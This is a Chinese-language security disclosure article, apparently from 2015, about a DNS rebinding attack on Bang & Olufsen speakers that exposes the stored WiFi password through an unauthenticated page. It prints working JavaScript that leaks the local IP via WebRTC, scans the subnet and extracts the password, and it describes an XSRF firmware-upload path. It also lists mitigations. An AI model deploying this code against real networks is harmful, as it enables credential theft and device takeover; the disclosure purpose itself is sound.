DNS REBINDING: 窃取WiFi密码

2015-04-21 14:22:46 阅读：23129次 点赞(0) 收藏 来源： 360安全播报

DNS 重绑定概要

DNS rebinding 攻击是作为攻击者掌握的破坏浏览器同源策略的非常好用的工具而被大众熟知的。攻击滥用DNS，在提供页面内容之后改变一个网址的IP地址，通常是一些临时的Javascript有效载荷，欺骗浏览器进入等待状态即DNS缓存无效并执行其他请求，但是仍然相信它是连接到同一个host上的，而实际上，它正在与一个新的被攻击者选中的IP地址通信。这样一来，攻击者可以访问内部服务，渗透出信息，或者做其他一些龌龊的事情。

概念攻击的现成证据确实存在，部署缓解是非常困难的并且不会总是有效（举个例子，DNS pinning不是万能的，dnswall只能在DNS响应中过滤掉私有的IP地址，防止一部分攻击来保护浏览器）

一次实际攻击：窃取WiFi密码

你会不会家庭网络中碰巧有一台很有趣的 Bang& Olufsen扬声器？

他们声音很大。他们利用Ethernet 或者WiFi连接到家庭网络，第一次输入密码之后就自动储存而不需要再次输入密码，并且他们配备了一个非常漂亮的Web交互界面。

你的WiFi密码当然是加密保存的，但是有趣的事情是，它被作为一个未经认证的页面呈现出来，/1000/Bo_network_settings.asp (无需登录认证)。这意味着只需要访问一个本地网络上的页面我们就可以看到密码。没什么大不了的，如果我们只考虑LAN的安全边界，并且如果同源策略组织浏览器读取来自其他源的请求反应。

这时，DNS重绑定就该大显身手了！

受害人访问恶意网站，我们称这个恶意网站为attacker.com，一个DNS用很短的生存时间（TTL），比如60s来记录。HTML页面上包含一个恶意的Javascript有效载荷，这个有效载荷利用著名的WebRTC内部IP漏洞获取本机的内部IP地址，推断出子网掩码并开始为B&O设备扫描。在我证明概念的代码中，自动创建并删除图像标记来寻找IP地址包含/images/BO_processing_grey.gif，典型的B&O设备。如果找到了一个，那么扫描结束，真正的DNS重绑定开始。

我们现在知道B&O设备内部IP地址（比如说是192.168.1.10），我们把这个IP发给攻击者的后端（必须允许通过CORS的跨域请求）。在后台运行的脚本更改网站的DNS记录192.168.1.10。与此同时，在客户端的JavaScript负载只是等待一会儿（超过一分钟）。一个熟练的攻击者可能会用一个游戏或者一个很长的有趣的说明文字吸引受害者注意，使其在页面上的停留时间长一点。一分钟之后，这个脚本会试图得到http://attacker.com/1000/Bo_network_settings.asp，DNS缓存过期，浏览器执行新的DNS请求，attacker现在解析IP102.168.1.10。因为浏览器认为我们仍处在同源，它就会很开心的读取响应啦。

搞定！

你可以从GitHub中得到完整的源码 https://github.com/mikispag/dns-rebinding-PoC。

var last_octet = 1;
function rtcGetPeerConnection() {
    var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection ||
        window.webkitRTCPeerConnection;
    if (!RTCPeerConnection) {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        var win = iframe.contentWindow;
        window.RTCPeerConnection = win.RTCPeerConnection;
        window.mozRTCPeerConnection = win.mozRTCPeerConnection;
        window.webkitRTCPeerConnection = win.webkitRTCPeerConnection;
        RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection ||
            window.webkitRTCPeerConnection;
    }
    if (typeof RTCPeerConnection === 'undefined')
        return;
    return RTCPeerConnection;
}
// WebRTC detection code taken from http://ipleak.net/static/js/index.js
function rtcDetection() {
    var ip_dups = {};
    var RTCPeerConnection = rtcGetPeerConnection();
    var mediaConstraints = {
        optional: [{
            RtpDataChannels: true
        }]
    };
    var servers = undefined;
    // Add the default Firefox STUN server for Chrome
    if (window.webkitRTCPeerConnection)
        servers = {
            iceServers: [{
                urls: "stun:stun.services.mozilla.com"
            }]
        };
    var pc = new RTCPeerConnection(servers, mediaConstraints);
    // Listen for candidate events
    pc.onicecandidate = function(ice) {
        if (ice.candidate) {
            var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
            var ip_addr_arr = ip_regex.exec(ice.candidate.candidate);
            if (ip_addr_arr && ip_addr_arr.length > 0) {
                var ip_addr = ip_addr_arr[1];
            } else return;
            // Remove duplicates
            if (ip_dups[ip_addr] === undefined) {
                if (ip_addr.startsWith("192.168")) {
                    findBOLocalIP(ip_addr);
                }
            }
            ip_dups[ip_addr] = true;
        }
    };
    pc.createDataChannel("");
    pc.createOffer(function(result) {
        pc.setLocalDescription(result, function() {},
            function() {});
    }, function() {});
}
function findBOLocalIP(clientLocalIP) {
    var ip_minus_last = clientLocalIP.substring(0, clientLocalIP.lastIndexOf('.'));
    $('#ip_msg').text("Your local IP is " + clientLocalIP + ", scanning " +
    ip_minus_last + ".x subnet...");
    // Try a /24 scan with 192.168.y.<i> with the exfiltrated y
    setInterval(function() {
        if (++last_octet < 255) {
            $("<img>", {
                    src: "http://" + ip_minus_last + "." + last_octet +
                        "/images/BO_processing_grey.gif",
                    id: ip_minus_last + "." + last_octet,
                })
                .bind('load', function() {
                    console.log("Found: " + this.id);
                    exfiltrateWiFiPassword(this.id);
                }).appendTo($('#container'));
        }
    }, 500);
    // Force to terminate stalled connections in order to avoid connection limit
    setTimeout(function() {
        setInterval(function() {
            $('#container').find(':first-child').unbind('load').attr('src',
            'data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=').remove();
        }, 500);
    }, 5000);
}
// Alternatively, you could get /1000/bo_restart_in_bsl.asp to trigger a
// restart in BSL mode, wait 30 seconds and upload your own firmware
// in /1000/bl_firmware_update.asp POSTing to
// /goform/formPostHandler a "uploadForm" form with a "appFirmware" file
// with enctype="multipart/form-data". No XSRF protection.
function exfiltrateWiFiPassword(ip) {
    // Send internal IP "ip" to the attacker: we need to change
    // the IP address of this attacker-controlled domain to the
    // B&O internal IP.
    //
    // THIS PART HAS NOT BEEN IMPLEMENTED BECAUSE IT IS NOT NECESSARY
    // FOR DEMONSTRATION PURPOSES.
    console.log("Exfiltrating WiFi password from " + ip + "...");
    $('#ip_msg').text("B&O device found at " + ip + "!").fadeIn();
    // Stop running scan...
    last_octet = 255;
    var WiFiPassword;
    // Wait 70 seconds (60 seconds for cache invalidation + 10 grace seconds)
    // and connect to the attacker-controlled host with the new IP.
    setTimeout(function() {
            var interval = setInterval(function() {
                $.get("/1000/Bo_network_settings.asp" +
                    '?dummy=' + Math.random(),
                    function(data) {
                        var start = data.lastIndexOf('top: -100px; display: none">');
                        if (start == -1) {
                            return;
                        }
                        WiFiPassword = data.slice(start + 28);
                        WiFiPassword = WiFiPassword.slice(0, WiFiPassword.indexOf('<'));
                        alert('Password WiFi: ' + WiFiPassword);
                        $('#ip_msg').text("WiFi password found: " + WiFiPassword);
                        clearInterval(interval);
                });
            }, 5000);
    }, 70000);
}

这些代码已经测试过了最新版本的Chrome，应该在除Opera之外的大部分浏览器上都试用。

让我们继续：远程固件上传

让我们看看web页面，我注意到似乎有的固件上传页面上没有反XSRF保护。攻击者不得不做的所有事情就是重新刷新远程获取 /1000/bo_restart_in_bsl.asp来触发装置重启服务（BSL）模式，等待30s，在/1000/bl_firmware_update.asp中上传一个自定义固件，POST到 /goform/formPostHandler一个带有一个appFirmware文件的uploadForm表单。

这意味着，它应该由可能远程刷新设备甚至不用DNS重绑定，这要归功于XSRF漏洞。我其实并没有尝试这么做，可能会有某种形式的签名验证来防止这样的攻击。

可能的缓解策略

嵌入式设备厂商应该意识到DNS重绑定的风险，由于很难把这项技术压入浏览器中，所以应该采取其他预防措施。

Web服务器应当检查Host主机的Header，尤其是被认为在本地网络中的设备。这是个非常棘手的问题，而且可能会破坏一些配置。

网络管理员可能希望用dnswall过滤来自外部DNS相应的私有IP地址，或者使用外部公共的DNS服务器过滤，比如OpenDNS。

我相信，对于B&O来说，最好的缓解颁发就是不使用在 /1000/Bo_network_settings.asp中储存好的WiFi密码（这就是输入型=密码，所以被屏蔽了！）并且在这点不到位的情况下，上传新的固件时使用签名验证。

结尾

DNS重绑定攻击是非常真实可用的，缓解策略经常并不足以保护用户的安全。在嵌入式设备中再结合广泛的不安全因素，使得可以进行攻击的范围更大。
